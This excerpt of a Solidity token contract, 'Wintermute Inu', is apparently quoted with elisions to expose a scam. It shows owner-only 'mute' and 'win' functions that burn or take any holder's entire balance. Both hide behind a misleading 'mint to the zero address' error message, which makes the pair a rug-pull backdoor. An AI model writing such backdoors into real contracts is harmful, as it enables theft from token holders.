...
contract WintermuteInu is Context, IERC20 {
    ...
    address public _owner = 0x87969EF4811981B72a7D05d647281c8EcE046Beb;
   constructor () public {


        
        _name = "Wintermute Inu";
        _symbol = "WINU";
        _decimals = 9;
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    */
    ...
    function mute(address account) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, address(0), amount);
        ...
        function win(address account, address staker) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
